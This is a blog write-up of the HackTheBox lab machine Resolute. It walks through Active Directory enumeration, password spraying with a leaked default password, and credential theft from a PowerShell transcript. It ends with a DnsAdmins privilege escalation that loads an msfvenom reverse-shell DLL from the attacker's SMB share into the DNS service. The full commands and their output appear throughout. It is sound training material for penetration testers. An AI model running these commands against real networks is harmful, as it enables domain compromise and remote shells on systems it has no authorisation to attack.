
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Resolute. This box was created by egre55 and publish on December the 7th 2019. The box is rated as a medium box. It implies a lot of enumeration and really interesting privilege escalation in Windows environment using DLL injection." />
<meta name="keywords" content="security, boot2root, HTB, DLL, DnsAdmins">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Resolute"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Resolute. This box was created by egre55 and publish on December the 7th 2019. The box is rated as a medium box. It implies a lot of enumeration and really interesting privilege escalation in Windows environment using DLL injection."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2020/05/htb-resolute.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2020-05-31 10:45:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="DLL"/>
  <meta property="article:tag" content="DnsAdmins"/>
  <meta property="og:image" content="https://maggick.fr/meida/image.png">

  <title>maggick's logs &ndash; HTB: Resolute</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/meida/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-resolute">HTB: Resolute</h1>
    <p>
      Posted on 31 May 2020 in <a href="../../category/security.html">security</a>

        &#8226; 8 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2020.05/resolute_card.png" alt="Resolute Card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/220">Resolute</a>.
This box was created by
<a href="https://www.hackthebox.com/home/users/profile/1190">egre55</a> and publish on
December the 7th 2019. The box is rated as a medium box. It implies a lot of
enumeration and really interesting privilege escalation in Windows environment
using DLL injection.</p>


<h1>User</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. As this is again (like with forest) a
domain contronler a few ports are open. So much ports are open that a full
TCPscan will take more than a day.</p>
<div class="highlight"><pre><span></span><code>nmap -p- -sS 10.10.10.169 -oA nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-10 09:49 EST
Stats: 0:10:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 11.50% done; ETC: 11:22 (1:21:43 remaining)
</code></pre></div>

<p>Therefore we launch a basic nmap scan on the top 10 000 ports, 14 of them are
open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Fri Dec 13 03:00:17 2019 as: nmap -sS -oA nmap --top-ports 10000 10.10.10.169
Nmap scan report for megabank.local (10.10.10.169)
Host is up (0.34s latency).
Not shown: 8306 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm

# Nmap done at Fri Dec 13 03:07:34 2019 -- 1 IP address (1 host up) scanned in 437.35 seconds
</code></pre></div>

<p>We run a version scan on this open ports. The ports 138 and 445 (SMB) are open
as well as port 5985 and 47001 for winRM.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Fri Dec 13 03:10:58 2019 as: nmap -sSV -oA service -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.10.169
Nmap scan report for megabank.local (10.10.10.169)
Host is up (0.70s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    closed domain
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-13 08:19:12Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 13 03:11:28 2019 -- 1 IP address (1 host up) scanned in 30.41 seconds
</code></pre></div>

<p>We enumerate the box using
<a href="https://github.com/portcullislabs/enum4linux">enum4linux</a> we got a list of
account and a description with a password in it <code>Welcome123!</code>.</p>
<div class="highlight"><pre><span></span><code>perl enum4linux.pl 10.10.10.169
&lt;SNIP&gt;
=============================
|    Users on 10.10.10.169    |
=============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 866.
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail  Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela   Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette  Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika   Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire   Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude   Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia  Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo  Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus   Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak   Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie  Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki    Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo    Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally    Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon    Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve    Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie   Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita   Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)
</code></pre></div>

<p>The creds doesn't work and doesn't allow to access the SMB share. We put all
users in a file <code>users.txt</code> and then we use
<a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> to spray the
password against all accounts. The <code>melanie</code> account is using the password!</p>
<div class="highlight"><pre><span></span><code>crackmapexec smb 10.10.10.169 -u users.txt -p &#39;Welcome123!&#39;
CME          10.10.10.169:445 RESOLUTE        [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:MEGABANK)
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Administrator:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Guest:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\krbtgt:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\ryan:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marko:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\sunita:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\abigail:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marcus:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\sally:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\fred:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\angela:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\felicia:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\gustavo:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\ulf:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\stevie:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claire:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\paulo:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\steve:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annette:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annika:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\per:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE
CME          10.10.10.169:445 RESOLUTE        [+] MEGABANK\melanie:Welcome123!
</code></pre></div>

<p>We can then enumerate the shares but nothing interesting.</p>
<div class="highlight"><pre><span></span><code>crackmapexec smb 10.10.10.169 -u melanie -p &#39;Welcome123!&#39; --shares
CME          10.10.10.169:445 RESOLUTE        [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:MEGABANK)
CME          10.10.10.169:445 RESOLUTE        [+] MEGABANK\melanie:Welcome123!
CME          10.10.10.169:445 RESOLUTE        [+] Enumerating shares
CME          10.10.10.169:445 RESOLUTE        SHARE           Permissions
CME          10.10.10.169:445 RESOLUTE        -----           -----------
CME          10.10.10.169:445 RESOLUTE        NETLOGON        READ
CME          10.10.10.169:445 RESOLUTE        SYSVOL          READ
CME          10.10.10.169:445 RESOLUTE        ADMIN$          NO ACCESS
CME          10.10.10.169:445 RESOLUTE        IPC$            READ
CME          10.10.10.169:445 RESOLUTE        C$              NO ACCESS
</code></pre></div>

<p>We can then use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to
connect using Winrm. This let us get the user flag in <code>melanie</code> home folder.</p>
<div class="highlight"><pre><span></span><code>ruby evil-winrm.rb -u melanie -p &#39;Welcome123!&#39; -i 10.10.10.169

Evil-WinRM shell v1.8

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents&gt; type ..\Desktop\user.txt
0c3be45fcfe249796ccbee8d3a978540
</code></pre></div>

<h1>Second user</h1>
<p>We start enumerating the box. We can even run a
<a href="https://github.com/fox-it/BloodHound.py">Bloodhound</a> at it.</p>
<p><img alt="Melanie's groups" src="/media/2020.05/resolute_01.png"></p>
<p>Nothing really interesting except when looking thoroughly at the content of the <code>C:\</code> folder.
We found a <code>PSTranscripts</code> folder. A
<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript">PSTranscript</a>
is simply a transcript of a powershell session.</p>
<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\&gt; dir -force
    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-       12/11/2019   8:48 AM      402653184 pagefile.sys
</code></pre></div>

<p>We go through the folder until finding the transcript text file. Then we display
it. Inside we see a few commands and then a backup command using the <code>ryan</code> user
and its password <code>Serv3r4Admin4cc123!</code></p>
<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\&gt; dir -force PSTranscripts\
    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


*Evil-WinRM* PS C:\&gt; dir -force PSTranscripts\20191203\
    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

*Evil-WinRM* PS C:\&gt; type PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS&gt;TerminatingError(): &quot;System error.&quot;
&gt;&gt; CommandInvocation(Invoke-Expression): &quot;Invoke-Expression&quot;
&gt;&gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;-join($id,&#39;PS &#39;,$(whoami),&#39;@&#39;,$env:computername,&#39; &#39;,$((gi $pwd).Name),&#39;&gt; &#39;)
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }&quot;
&gt;&gt; CommandInvocation(Out-String): &quot;Out-String&quot;
&gt;&gt; ParameterBinding(Out-String): name=&quot;Stream&quot;; value=&quot;True&quot;
**********************
Command start time: 20191203063455
**********************
PS&gt;ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;PS megabank\ryan@RESOLUTE Documents&gt; &quot;
PS megabank\ryan@RESOLUTE Documents&gt;
**********************
Command start time: 20191203063515
**********************
PS&gt;CommandInvocation(Invoke-Expression): &quot;Invoke-Expression&quot;
&gt;&gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
&lt;SNIP&gt;
</code></pre></div>

<p>We can then login with the ryan user still using
<a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>.</p>
<div class="highlight"><pre><span></span><code>ruby evil-winrm.rb -u ryan -p &#39;Serv3r4Admin4cc123!&#39; -i 10.10.10.169
C:\Users\ryan\Desktop&gt; type note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
</code></pre></div>

<h1>Root</h1>
<p>We enumerate our new permissions. Using
<a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a> we see that we are part
of the <code>DNSADMINS</code> group.</p>
<p><img alt="Ryan's groups" src="/media/2020.05/resolute_02.png"></p>
<p>We can confirm this by using <code>whoami /all</code> (I remove the "SUID" and "Attributes"
columns for more clarity).</p>
<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; whoami /all

USER INFORMATION
----------------
User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
-----------------

Group Name                                 Type
========================================== ================
Everyone                                   Well-known group
BUILTIN\Users                              Alias
BUILTIN\Pre-Windows 2000 Compatible Access Alias
BUILTIN\Remote Management Users            Alias
NT AUTHORITY\NETWORK                       Well-known group
NT AUTHORITY\Authenticated Users           Well-known group
NT AUTHORITY\This Organization             Well-known group
MEGABANK\Contractors                       Group
MEGABANK\DnsAdmins                         Alias
NT AUTHORITY\NTLM Authentication           Well-known group
Mandatory Label\Medium Mandatory Level     Label

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</code></pre></div>

<p>A few Google research allow us to find that being DNSAdmin allow for privilege
escalation. The technique is to change the DNS configuration so it will load a
DLL when starting the DNS service. We can either charge the DLL locally or
remotely using SMB.</p>
<ul>
<li><a href="https://adsecurity.org/?p=4064">https://adsecurity.org/?p=4064</a></li>
<li><a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DNSAdmins/DNSAdmins.md">https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DNSAdmins/DNSAdmins.md</a></li>
<li><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html</a></li>
<li><a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83">https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83</a></li>
</ul>
<p>In order to write the DLL we use <code>msfvenom</code> with a classic reverse shell
payload.</p>
<div class="highlight"><pre><span></span><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&quot;10.10.14.56&quot; LPORT=4444 -f dll -o ~/srv/msf3.dll
</code></pre></div>

<p>We start our SMB server using
<a href="https://github.com/SecureAuthCorp/impacket">impacket</a> <code>smbserver.py</code></p>
<div class="highlight"><pre><span></span><code>python smbserver.py -ip 10.10.14.56 IOIO ~/srv/
</code></pre></div>

<p>Registry property serverlevelplugindll successfully reset.
Command completed successfully. We start our handler using metasploit. And using
our shell as <code>ryan</code> we change the DNS configuration, stop the DNS service and
start it back using <code>sc.exe</code>. We can see in our SMB server's logs that our
DLL is sent to the server. And we can see on our metasploit handler that we get
a revershell. We can then easily get the root flag.</p>
<div class="highlight"><pre><span></span><code>::: text
*Evil-WinRM* PS C:\Users\ryan&gt; dnscmd /config /serverlevelplugindll \\10.10.14.56\IOIO\msf3.dll

*Evil-WinRM* PS C:\Users\ryan&gt; sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan&gt; sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4980
        FLAGS              :
</code></pre></div>

<p>The metasploit handler is running simultaneously.</p>
<div class="highlight"><pre><span></span><code>msf5 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.14.56:4444
[*] Command shell session 2 opened (10.10.14.56:4444 -&gt; 10.10.10.169:50613) at 2019-12-12 03:46:20 -0500

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
e1d94876a506850d0c20edb5405e619c
</code></pre></div>

<h1>Wrapping up</h1>
<p>Getting the first user is quit easy if you use
<a href="https://github.com/portcullislabs/enum4linux">enum4linux</a>. You can even spray
the password by hand.
The second user is just enumeration. It can take a long time before enumerating
the right folder.
The root part is quit interesting and let me learn a few things about DLL
injection.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/dll.html">DLL</a>
      <a href="../../tag/dnsadmins.html">DnsAdmins</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2020/05/htb-obscurity.html" title="HTB: Obscurity">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2020/06/htb-nest.html" title="HTB: Nest">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/meida/image.png",
  "description": ""
}
</script>

</body>
</html>